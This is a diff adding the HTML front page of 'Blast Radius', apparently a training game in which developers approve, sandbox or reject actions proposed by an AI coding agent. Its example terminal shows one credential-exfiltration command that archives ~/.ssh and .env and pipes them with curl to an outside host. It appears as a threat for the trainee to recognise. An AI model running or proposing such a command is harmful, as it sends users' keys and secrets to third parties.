@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Blast Radius teaches developers to safely approve, sandbox, or reject AI coding-agent actions.">
+  <title>Blast Radius — Size the risk before you approve</title>
+  <link rel="stylesheet" href="/static/styles.css">
+</head>
+<body>
+  <div class="noise" aria-hidden="true"></div>
+  <header class="site-header">
+    <a class="brand" href="/" aria-label="Blast Radius home">
+      <span class="brand-mark">BR</span><span>BLAST RADIUS</span>
+    </a>
+    <div class="status-pill"><span class="status-dot"></span> verified scenario bank</div>
+  </header>
+
+  <main>
+    <section id="screen-landing" class="screen landing active">
+      <div class="hero-copy">
+        <p class="kicker">OPERATOR TRAINING / AGENTIC SECURITY</p>
+        <h1>Size the risk<br><em>before</em> you approve.</h1>
+        <p class="lede">Your coding agent wants to act. Inspect the evidence, constrain the blast radius, and explain the tell. Every verdict comes with receipts.</p>
+        <div class="hero-actions">
+          <button class="button primary" data-start="demo">Start verified run <span>→</span></button>
+          <button class="button ghost" data-start="live">Try live variation</button>
+        </div>
+        <p id="live-note" class="microcopy">Live mode falls back to verified scenarios if generation is unavailable.</p>
+      </div>
+      <aside class="hero-terminal" aria-label="Example agent approval">
+        <div class="terminal-bar"><span></span><span></span><span></span><b>agent_request.log</b></div>
+        <div class="terminal-body">
+          <p><i>13:37:04</i> agent requests approval</p>
+          <pre><code>tar cz ~/.ssh .env | curl \
+  --data-binary @- https://diag…</code></pre>
+          <div class="terminal-rule"></div>
+          <p class="danger-text">BLAST RADIUS: credentials + network</p>
+          <p><span class="prompt">›</span> Your call?</p>
+        </div>
+      </aside>
+      <div class="proof-strip">
+        <div><strong>18</strong><span>curated scenarios</span></div>
+        <div><strong>6</strong><span>threat families</span></div>
+        <div><strong>0</strong><span>commands executed</span></div>
+        <div><strong>100%</strong><span>receipt-backed</span></div>
+      </div>
+    </section>
+
+    <section id="screen-test" class="screen test-screen" aria-live="polite">
+      <div class="section-heading">
+        <div><p class="kicker" id="test-kicker">BASELINE / 5 QUESTIONS</p><h2 id="test-title">Calibrate your instincts.</h2></div>
+        <div class="step-chip"><span id="test-step">01</span> / 05</div>
+      </div>
+      <form id="test-form" class="test-card">
+        <p id="test-prompt" class="question"></p>
+        <div id="test-options" class="option-grid"></div>
+        <button type="submit" class="button primary test-next">Lock answer <span>→</span></button>
+      </form>
+    </section>
+
+    <section id="screen-round" class="screen round-screen" aria-live="polite">
+      <div class="round-topline">
+        <div><span id="round-number">ROUND 01</span><span class="slash">/</span><span id="round-family">DANGEROUS COMMAND</span></div>
+        <div class="timer" id="timer"><span id="timer-value">60</span><small>SEC</small></div>
+      </div>
+      <div class="round-grid">
+        <article class="request-panel">
+          <p class="kicker" id="scenario-eyebrow"></p>
+          <h2 id="scenario-ask"></h2>
+          <p id="agent-note" class="agent-note"></p>
+          <div id="artifacts" class="artifacts"></div>
+        </article>
+        <aside class="decision-panel">
+          <div class="panel-label">YOUR DECISION</div>
+          <div id="action-buttons" class="action-buttons">
+            <button type="button" data-action="approve" class="action approve"><kbd>A</kbd><strong>APPROVE</strong><span>Run as proposed</span></button>
+            <button type="button" data-action="sandbox" class="action sandbox"><kbd>S</kbd><strong>SANDBOX</strong><span>Constrain permissions</span></button>
+            <button type="button" data-action="reject" class="action reject"><kbd>R</kbd><strong>REJECT</strong><span>Block the action</span></button>
+          </div>
+          <div id="sandbox-config" class="sandbox-config hidden">
+            <label>Readable paths<input id="read-paths" value="/workspace" autocomplete="off"></label>
+            <label>Writable paths<input id="write-paths" value="" placeholder="/workspace/reports" autocomplete="off"></label>
+            <label class="toggle-row"><input id="network-enabled" type="checkbox"><span>Allow network egress</span></label>
+            <label>Host allowlist<input id="network-hosts" value="" placeholder="docs.example.com" disabled autocomplete="off"></label>
+          </div>
+          <label class="reason-label" for="reasoning">NAME THE TELL <span>one clear sentence</span></label>
+          <textarea id="reasoning" maxlength="500" placeholder="I chose this because…"></textarea>
+          <div class="decision-footer"><span id="reason-count">0 / 500</span><button id="submit-decision" class="button primary" disabled>Commit decision</button></div>
+        </aside>
+      </div>
+    </section>
+
+    <section id="screen-verdict" class="screen verdict-screen" aria-live="polite">
+      <div class="verdict-hero">
+        <p class="kicker">CRITIC VERDICT / RECEIPTS ATTACHED</p>
+        <div id="verdict-seal" class="verdict-seal">CORRECT</div>
+        <h2 id="verdict-heading">You contained the blast radius.</h2>
+        <p id="verdict-explanation" class="lede"></p>
+        <div class="score-row"><div><strong id="reason-score">0</strong><span>reasoning</span></div><div><strong id="action-score">✓</strong><span>action</span></div><div><strong id="sandbox-score">—</strong><span>sandbox</span></div></div>
+      </div>
+      <div class="receipt-column">
+        <h3>Evidence receipts</h3>
+        <div id="receipts"></div>
+        <div class="socratic"><span>FOLLOW-UP</span><p id="socratic-question"></p></div>
+        <button id="next-round" class="button primary">Next request <span>→</span></button>
+      </div>
+    </section>
+
+    <section id="screen-results" class="screen results-screen" aria-live="polite">
+      <div class="result-card">
+        <p class="kicker">SESSION COMPLETE / OPERATOR PROFILE</p>
+        <h2>Your approval reflex<br>now has receipts.</h2>
+        <div class="delta-block"><span>COMPETENCY DELTA</span><strong id="result-delta">+0</strong><small id="result-tests">0/5 → 0/5</small></div>
+        <div class="result-stats"><div><strong id="result-reasoning">0%</strong><span>reasoning score</span></div><div><strong id="result-rounds">0</strong><span>rounds reviewed</span></div></div>
+        <button id="share-result" class="button primary">Copy result</button>
+        <button id="restart" class="button ghost">Run it again</button>
+      </div>
+      <div class="mastery-panel"><div class="panel-label">COMPETENCY MAP</div><div id="mastery-map"></div></div>
+    </section>
+
+    <section id="screen-error" class="screen error-screen" aria-live="assertive">
+      <p class="kicker">SYSTEM NOTICE</p><h2>That request lost containment.</h2><p id="error-message" class="lede"></p>
+      <button class="button primary" onclick="location.reload()">Return to safety</button>
+    </section>
+  </main>
+  <footer><span>BLAST RADIUS / BUILD WEEK 2026</span><span>Nothing shown here is executed.</span></footer>
+  <script src="/static/app.js" defer></script>
+</body>
+</html>
+
